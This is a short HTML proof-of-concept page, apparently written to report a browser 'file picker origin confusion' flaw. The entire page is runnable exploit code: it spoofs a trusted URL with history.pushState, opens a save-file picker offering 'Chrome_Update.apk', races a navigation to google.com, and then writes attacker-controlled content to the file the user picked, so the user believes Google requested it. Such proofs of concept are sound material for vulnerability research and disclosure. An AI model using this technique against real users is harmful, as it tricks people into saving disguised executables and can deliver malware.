<!doctype html>
<title>File Picker Origin Confusion PoC</title>

<h1 id="trigger">Click to continue</h1>

<script>
let fileHandle;

document.getElementById('trigger').onclick = async () => {
  // Step 1: Fake trusted URL
  history.pushState({}, '', '/trusted/update');

  // Step 2: Open privileged picker
  fileHandle = await showSaveFilePicker({
    suggestedName: 'Chrome_Update.apk',
    types: [{
      description: 'Executable',
      accept: { 'application/octet-stream': ['.apk'] }
    }]
  });

  // Step 3: Navigation race
  setTimeout(() => {
    location.href = 'https://www.google.com';
  }, 50);

  // Step 4: Attacker STILL writes file
  setTimeout(async () => {
    const writable = await fileHandle.createWritable();
    await writable.write(
      'ATTACKER-CONTROLLED CONTENT\n' +
      'User believed Google requested this file'
    );
    await writable.close();
  }, 200);
};
</script>
